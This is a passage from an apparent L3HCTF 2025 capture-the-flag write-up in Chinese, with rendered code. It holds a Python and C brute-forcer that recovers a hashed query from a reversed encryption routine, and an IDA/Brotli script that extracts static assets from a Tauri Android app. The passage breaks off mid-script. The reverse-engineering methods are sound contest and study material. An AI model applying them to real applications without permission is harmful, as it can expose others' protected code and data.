</span></span></span><span class=line><span class=cl><span class=s2>    对应 C++ 函数 sub_7FF65E2B184D (加密主函数)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>timestamp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 循环 3 轮</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>round_key</span> <span class=o>=</span> <span class=n>generate_round_key</span><span class=p>(</span><span class=n>r_key</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>state</span> <span class=o>^=</span> <span class=n>round_key</span>
</span></span><span class=line><span class=cl>        <span class=n>state</span> <span class=o>=</span> <span class=n>round_function</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>s_box_table</span><span class=p>,</span> <span class=n>p_box_table</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 循环后的第4步</span>
</span></span><span class=line><span class=cl>    <span class=n>round_key_4</span> <span class=o>=</span> <span class=n>generate_round_key</span><span class=p>(</span><span class=n>r_key</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>^=</span> <span class=n>round_key_4</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=n>s_box_transform</span><span class=p>(</span><span class=n>state</span><span class=p>,</span> <span class=n>s_box_table</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 最终返回前的第5步</span>
</span></span><span class=line><span class=cl>    <span class=n>round_key_5</span> <span class=o>=</span> <span class=n>generate_round_key</span><span class=p>(</span><span class=n>r_key</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>final_state</span> <span class=o>=</span> <span class=n>state</span> <span class=o>^</span> <span class=n>round_key_5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>to_u32</span><span class=p>(</span><span class=n>final_state</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1751990400</span><span class=p>,</span> <span class=mi>1752052052</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>dword</span> <span class=o>=</span> <span class=n>t</span>
</span></span><span class=line><span class=cl>    <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cnt</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>cnt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>        <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>        <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>        <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>        <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cnt</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>dword</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>gen</span><span class=p>(</span><span class=n>dword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>    <span class=c1># pow(a | x, 2)</span>
</span></span><span class=line><span class=cl>    <span class=n>val1</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>pow</span><span class=p>(</span><span class=nb>float</span><span class=p>(</span><span class=n>to_s32</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=o>|</span> <span class=n>to_s32</span><span class=p>(</span><span class=n>x</span><span class=p>)),</span> <span class=mf>2.0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># pow(b | y, 2)</span>
</span></span><span class=line><span class=cl>    <span class=n>val2</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>pow</span><span class=p>(</span><span class=nb>float</span><span class=p>(</span><span class=n>to_s32</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=o>|</span> <span class=n>to_s32</span><span class=p>(</span><span class=n>y</span><span class=p>)),</span> <span class=mf>2.0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>math</span><span class=o>.</span><span class=n>isclose</span><span class=p>(</span><span class=mh>0x61</span> <span class=o>*</span> <span class=n>val1</span><span class=p>,</span> <span class=mh>0xb</span> <span class=o>*</span> <span class=n>val2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>encrypt_token</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>S_BOX_TABLE_7FF65E2BC020</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>P_BOX_TABLE_7FF65E2BC0A0</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>query</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=</span><span class=si>{</span><span class=n>t</span><span class=si>}</span><span class=s2>&amp;r=</span><span class=si>{</span><span class=n>r</span><span class=si>}</span><span class=s2>&amp;cipher=</span><span class=si>{</span><span class=n>cipher</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>query</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=</span><span class=si>{</span><span class=n>t</span><span class=si>}</span><span class=s2>&amp;r=</span><span class=si>{</span><span class=n>r</span><span class=si>}</span><span class=s2>&amp;a=</span><span class=si>{</span><span class=n>a</span><span class=si>}</span><span class=s2>&amp;b=</span><span class=si>{</span><span class=n>b</span><span class=si>}</span><span class=s2>&amp;x=</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>&amp;y=</span><span class=si>{</span><span class=n>y</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=n>query</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>md5</span><span class=p>(</span><span class=n>query</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=o>==</span> <span class=s2>&#34;8a2fc1e9e2830c37f8a7f51572a640aa&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>sha1</span><span class=p>(</span><span class=n>query</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>但python爆破速度非常慢，直接让gemini转为c语言脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;math.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>// 引入 OpenSSL 库头文件
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;openssl/md5.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;openssl/sha.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 伪随机数生成器，对应 python 的 gen 函数
</span></span></span><span class=line><span class=cl><span class=c1>// 使用指针来返回两个值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>gen</span><span class=p>(</span><span class=kt>uint32_t</span><span class=o>*</span> <span class=n>dword</span><span class=p>,</span> <span class=kt>uint32_t</span><span class=o>*</span> <span class=n>ret</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>v1</span> <span class=o>=</span> <span class=p>((((</span><span class=o>*</span><span class=n>dword</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span> <span class=o>^</span> <span class=o>*</span><span class=n>dword</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>17</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=o>*</span><span class=n>dword</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span> <span class=o>^</span> <span class=o>*</span><span class=n>dword</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>dword</span> <span class=o>=</span> <span class=p>(</span><span class=mi>32</span> <span class=o>*</span> <span class=n>v1</span><span class=p>)</span> <span class=o>^</span> <span class=n>v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>ret</span> <span class=o>=</span> <span class=o>*</span><span class=n>dword</span> <span class=o>&amp;</span> <span class=mh>0x7FFFFFFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 辅助函数：将二进制哈希值转换为十六进制字符串
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>bytes_to_hex</span><span class=p>(</span><span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span> <span class=n>bytes</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>hex_string</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>len</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>sprintf</span><span class=p>(</span><span class=n>hex_string</span> <span class=o>+</span> <span class=p>(</span><span class=n>i</span> <span class=o>*</span> <span class=mi>2</span><span class=p>),</span> <span class=s>&#34;%02x&#34;</span><span class=p>,</span> <span class=n>bytes</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>hex_string</span><span class=p>[</span><span class=n>len</span> <span class=o>*</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>target_md5</span> <span class=o>=</span> <span class=s>&#34;8a2fc1e9e2830c37f8a7f51572a640aa&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>uint32_t</span> <span class=n>t</span> <span class=o>=</span> <span class=mi>1751990400</span><span class=p>;</span> <span class=n>t</span> <span class=o>&lt;</span> <span class=mi>1752052052</span><span class=p>;</span> <span class=o>++</span><span class=n>t</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>dword</span> <span class=o>=</span> <span class=n>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// 初始 gen 调用
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>cnt</span> <span class=o>=</span> <span class=n>ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>a</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>b</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>x</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>y</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>i</span> <span class=o>&lt;</span> <span class=n>cnt</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>x</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>y</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>cnt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>gen</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dword</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// C中需要更大的缓冲区来格式化字符串
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>char</span> <span class=n>query</span><span class=p>[</span><span class=mi>512</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>snprintf</span><span class=p>(</span><span class=n>query</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>query</span><span class=p>),</span> <span class=s>&#34;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=%u&amp;r=%u&amp;a=%u&amp;b=%u&amp;x=%u&amp;y=%u&#34;</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;%u %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>query</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span> <span class=c1>// 强制刷新输出缓冲区，确保立即看到打印
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=c1>// 计算 MD5
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>md5_result</span><span class=p>[</span><span class=n>MD5_DIGEST_LENGTH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>MD5</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>query</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>query</span><span class=p>),</span> <span class=n>md5_result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>md5_hex</span><span class=p>[</span><span class=n>MD5_DIGEST_LENGTH</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>bytes_to_hex</span><span class=p>(</span><span class=n>md5_result</span><span class=p>,</span> <span class=n>md5_hex</span><span class=p>,</span> <span class=n>MD5_DIGEST_LENGTH</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// 比较 MD5
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>md5_hex</span><span class=p>,</span> <span class=n>target_md5</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Found MD5 match!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=c1>// 计算并打印 SHA1
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>sha1_result</span><span class=p>[</span><span class=n>SHA_DIGEST_LENGTH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>SHA1</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>query</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>query</span><span class=p>),</span> <span class=n>sha1_result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=n>sha1_hex</span><span class=p>[</span><span class=n>SHA_DIGEST_LENGTH</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>bytes_to_hex</span><span class=p>(</span><span class=n>sha1_result</span><span class=p>,</span> <span class=n>sha1_hex</span><span class=p>,</span> <span class=n>SHA_DIGEST_LENGTH</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>printf</span><span class=p>(</span><span class=s>&#34;SHA1: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>sha1_hex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span> <span class=c1>// 找到结果，退出循环
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> 
</span></span></code></pre></td></tr></table></div></div><p><code>gcc ./paradox_solve.c -o solve -lssl -lcrypto -lm</code></p><p><img src=https://su-team.cn/img/2025-L3HCTF/120aaaf1-4c0c-4433-b770-fbd9cab49792.png alt=img></p><p>得到正确query的sha1结果</p><h2 id=ez_android>ez_android</h2><p><img src=https://su-team.cn/img/2025-L3HCTF/b498a370-9988-401a-af1e-bb924e26edaf.png alt=img></p><p>TauriActivity特征，需要去解包静态资源，本来想着直接Hook Webview直接调试的，结果不知道为啥一hook就进不去程序，无奈只能老老实实解包看看咋个事情</p><p><img src=https://su-team.cn/img/2025-L3HCTF/f4783aca-b0da-44ae-bf1d-03e9a30c2376.png alt=img></p><p>首先看静态资源表，这里分别是name nameLen contentPtr contentSize，那么就解压size就行</p><p>翻了一下去年L3H的脚本居然还能用</p><p>解包都是这个脚本，地址的话就是压缩内容的范围</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=mh>0x140371D3A</span> <span class=c1># 这里的地址是压缩内容的地址</span>
</span></span><span class=line><span class=cl><span class=n>endadd</span> <span class=o>=</span> <span class=mh>0x1403772A8</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>dump</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=n>endadd</span> <span class=o>-</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>endadd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>dump</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=n>addr</span><span class=p>]</span> <span class=o>=</span> <span class=n>get_wide_byte</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>file_path</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;D:\算法训练\一堆比赛\L3H\dump.br&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>dump</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Dump written to </span><span class=si>{</span><span class=n>file_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>brotli</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>compressed_file_path</span> <span class=o>=</span> <span class=s2>&#34;dump.br&#34;</span>
</span></span><span class=line><span class=cl><span class=n>output_file_path</span> <span class=o>=</span> <span class=s2>&#34;dumpp&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>content</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>compressed_file_path</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Compressed file size: </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span><span class=si>}</span><span class=s2> bytes&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>try_decompress</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>brotli</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
